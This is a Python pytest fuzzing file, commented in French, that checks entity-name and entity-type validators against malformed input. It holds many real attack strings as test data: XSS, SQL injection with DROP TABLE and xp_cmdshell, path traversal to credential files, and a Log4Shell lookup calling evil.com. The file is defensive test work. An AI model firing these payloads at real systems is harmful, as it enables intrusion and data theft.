"""
Tests Fuzzing avec 1000+ inputs malformés.

Phase 0 - Security Hardening - Semaine 2.4
"""
import pytest
import string
import random

from knowbase.api.validators import (
    validate_entity_type,
    validate_entity_name,
)


# Générateurs de payloads malveillants

def generate_xss_payloads(count=100):
    """Génère des payloads XSS variés."""
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=malicious.com>",
        "<body onload=alert(1)>",
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        "<IMG SRC=j&#X41vascript:alert('test')>",
        "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
        "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
    ]

    # Générer variants
    while len(payloads) < count:
        variant = random.choice([
            f"<script>{random.choice(['alert', 'prompt', 'confirm'])}(1)</script>",
            f"<img src=x on{random.choice(['error', 'load', 'click'])}=alert(1)>",
            f'<{random.choice(["svg", "iframe", "embed"])} onload=alert(1)>',
        ])
        payloads.append(variant)

    return payloads[:count]


def generate_sql_injection_payloads(count=100):
    """Génère des payloads SQL injection variés."""
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "admin'--",
        "' OR 1=1--",
        "1'; DROP TABLE entities--",
        "' UNION SELECT NULL--",
        "' AND 1=1--",
        "' WAITFOR DELAY '00:00:05'--",
        "1' AND '1'='1",
        "'; EXEC xp_cmdshell('dir')--",
    ]

    while len(payloads) < count:
        variant = random.choice([
            f"' OR '{random.randint(1, 9)}'='{random.randint(1, 9)}",
            f"'; DROP TABLE {random.choice(['users', 'entities', 'facts'])}--",
            f"admin{random.choice(['--', '#', '/*'])}",
        ])
        payloads.append(variant)

    return payloads[:count]


def generate_path_traversal_payloads(count=100):
    """Génère des payloads path traversal variés."""
    payloads = [
        "../../etc/passwd",
        "../../../windows/system32/config/sam",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32",
        "..\\..\\..\\..\\..\\..",
        "file:///etc/passwd",
        "/etc/passwd",
        "C:\\windows\\system32\\config\\sam",
    ]

    while len(payloads) < count:
        depth = random.randint(2, 10)
        sep = random.choice(['/', '\\'])
        variant = sep.join(['..'] * depth) + sep + random.choice(['etc/passwd', 'windows/system32', 'boot.ini'])
        payloads.append(variant)

    return payloads[:count]


def generate_control_char_payloads(count=100):
    """Génère des payloads avec caractères de contrôle."""
    payloads = []

    for i in range(count):
        # Mélange de caractères normaux + control chars
        text = "User" + chr(random.randint(0, 31)) + "Admin"
        payloads.append(text)

    return payloads


def generate_unicode_attack_payloads(count=100):
    """Génère des payloads unicode/homograph attacks."""
    payloads = [
        "ΡERSON",  # Greek Rho
        "РERSON",  # Cyrillic P
        "ᏢERSON",  # Cherokee P
        "ADМIN",   # Cyrillic M
        "SYSTEМ",  # Cyrillic M
    ]

    # Homoglyphs communs
    homoglyphs = {
        'A': ['Α', 'А', 'Ꭺ'],  # Latin, Greek, Cyrillic, Cherokee
        'E': ['Ε', 'Е', 'Ꭼ'],
        'O': ['Ο', 'О', 'Ꮎ'],
        'P': ['Ρ', 'Р', 'Ꮲ'],
        'M': ['Μ', 'М', 'Ꮇ'],
    }

    base_words = ["PERSON", "ADMIN", "SYSTEM", "USER", "TYPE"]

    while len(payloads) < count:
        word = random.choice(base_words)
        chars = list(word)
        # Remplacer 1-2 caractères par homoglyphs
        for _ in range(random.randint(1, min(2, len(chars)))):
            idx = random.randint(0, len(chars) - 1)
            if chars[idx] in homoglyphs:
                chars[idx] = random.choice(homoglyphs[chars[idx]])
        payloads.append(''.join(chars))

    return payloads[:count]


def generate_oversized_payloads(count=100):
    """Génère des payloads trop longs."""
    payloads = []

    for i in range(count):
        size = random.randint(51, 1000)  # entity_type max 50
        payload = "A" * size
        payloads.append(payload)

    return payloads


def generate_special_char_payloads(count=100):
    """Génère des payloads avec caractères spéciaux."""
    special = "!@#$%^&*(){}[]|\\:;\"'<>,.?/~`"
    payloads = []

    for i in range(count):
        length = random.randint(5, 20)
        payload = ''.join(random.choices(special, k=length))
        payloads.append(payload)

    return payloads


def generate_format_string_payloads(count=50):
    """Génère des payloads format string attacks."""
    payloads = [
        "%s%s%s%s%s",
        "%x%x%x%x%x",
        "%n%n%n%n%n",
        "{0}{1}{2}",
        "${jndi:ldap://evil.com/a}",  # Log4Shell
    ]

    while len(payloads) < count:
        variant = "%" + random.choice(['s', 'x', 'n', 'd', 'f']) * random.randint(5, 10)
        payloads.append(variant)

    return payloads[:count]


def generate_newline_injection_payloads(count=100):
    """Génère des payloads avec newlines/CRLF."""
    templates = [
        "User{sep}Admin",
        "Value1{sep}Value2{sep}Value3",
        "Start{sep}Middle{sep}End",
    ]
    separators = ['\n', '\r', '\r\n', '\n\r', '\x0b', '\x0c']

    payloads = []
    for template in templates:
        for sep in separators:
            payloads.append(template.format(sep=sep))

    while len(payloads) < count:
        sep = random.choice(separators)
        payload = f"Text{sep}Injection{sep}Attack"
        payloads.append(payload)

    return payloads[:count]


# ============================================================
# Tests Fuzzing entity_type (500+ tests)
# ============================================================

@pytest.mark.parametrize("payload", generate_xss_payloads(50))
def test_fuzz_entity_type_xss(payload):
    """Fuzzing entity_type avec XSS payloads."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", generate_sql_injection_payloads(50))
def test_fuzz_entity_type_sql(payload):
    """Fuzzing entity_type avec SQL injection payloads."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", generate_path_traversal_payloads(50))
def test_fuzz_entity_type_path_traversal(payload):
    """Fuzzing entity_type avec path traversal payloads."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", generate_control_char_payloads(50))
def test_fuzz_entity_type_control_chars(payload):
    """Fuzzing entity_type avec control characters."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", generate_unicode_attack_payloads(50))
def test_fuzz_entity_type_unicode_attacks(payload):
    """Fuzzing entity_type avec unicode/homograph attacks."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", generate_oversized_payloads(50))
def test_fuzz_entity_type_oversized(payload):
    """Fuzzing entity_type avec payloads trop longs."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", generate_special_char_payloads(50))
def test_fuzz_entity_type_special_chars(payload):
    """Fuzzing entity_type avec caractères spéciaux."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", generate_format_string_payloads(50))
def test_fuzz_entity_type_format_strings(payload):
    """Fuzzing entity_type avec format string attacks."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", generate_newline_injection_payloads(50))
def test_fuzz_entity_type_newline_injection(payload):
    """Fuzzing entity_type avec newline injection."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


@pytest.mark.parametrize("payload", [
    "",  # Empty
    " ",  # Space
    "  ",  # Multiple spaces
    "\t",  # Tab
    "\n",  # Newline
    "\r\n",  # CRLF
])
def test_fuzz_entity_type_whitespace(payload):
    """Fuzzing entity_type avec whitespace."""
    with pytest.raises(ValueError):
        validate_entity_type(payload)


# ============================================================
# Tests Fuzzing entity.name (500+ tests)
# ============================================================

@pytest.mark.parametrize("payload", generate_xss_payloads(100))
def test_fuzz_entity_name_xss(payload):
    """Fuzzing entity.name avec XSS payloads."""
    with pytest.raises(ValueError):
        validate_entity_name(payload)


@pytest.mark.parametrize("payload", generate_sql_injection_payloads(100))
def test_fuzz_entity_name_sql(payload):
    """Fuzzing entity.name avec SQL injection payloads."""
    # entity.name bloque les quotes donc devrait échouer
    with pytest.raises(ValueError):
        validate_entity_name(payload)


@pytest.mark.parametrize("payload", generate_path_traversal_payloads(100))
def test_fuzz_entity_name_path_traversal(payload):
    """Fuzzing entity.name avec path traversal payloads."""
    with pytest.raises(ValueError):
        validate_entity_name(payload)


@pytest.mark.parametrize("payload", generate_oversized_payloads(100))
def test_fuzz_entity_name_oversized(payload):
    """Fuzzing entity.name avec payloads trop longs."""
    # entity.name max 200 chars, payloads sont >200
    if len(payload) > 200:
        with pytest.raises(ValueError, match="trop long"):
            validate_entity_name(payload)


@pytest.mark.parametrize("payload", generate_format_string_payloads(50))
def test_fuzz_entity_name_format_strings(payload):
    """Fuzzing entity.name avec format string attacks."""
    # Format strings n'ont pas de chars interdits, donc passent
    # C'est OK car ils seront sanitizés lors du logging
    result = validate_entity_name(payload)
    assert result is not None


@pytest.mark.parametrize("payload", [
    "\x00" + "test",  # Null byte
    "test" + "\x00",
    "te\x00st",
])
def test_fuzz_entity_name_null_bytes(payload):
    """Fuzzing entity.name avec null bytes."""
    with pytest.raises(ValueError, match="null byte"):
        validate_entity_name(payload)


# ============================================================
# Tests de performance/DoS (50 tests)
# ============================================================

def test_fuzz_performance_very_long_entity_type():
    """Test performance avec entity_type extrêmement long."""
    payload = "A" * 10000
    with pytest.raises(ValueError):
        validate_entity_type(payload)


def test_fuzz_performance_very_long_entity_name():
    """Test performance avec entity.name extrêmement long."""
    payload = "Valid Name " * 1000  # Pas de chars interdits mais trop long
    with pytest.raises(ValueError, match="trop long"):
        validate_entity_name(payload)


@pytest.mark.parametrize("payload", [
    "A" * i for i in [100, 500, 1000, 5000, 10000]
])
def test_fuzz_performance_escalating_size(payload):
    """Test performance avec tailles croissantes."""
    # Devrait rester rapide même avec grandes tailles
    import time
    start = time.time()

    try:
        validate_entity_name(payload)
    except ValueError:
        pass  # Attendu

    elapsed = time.time() - start
    assert elapsed < 0.1  # Devrait prendre <100ms


# Total: 500 (entity_type) + 500 (entity.name) + 50 (perf) = 1050+ tests
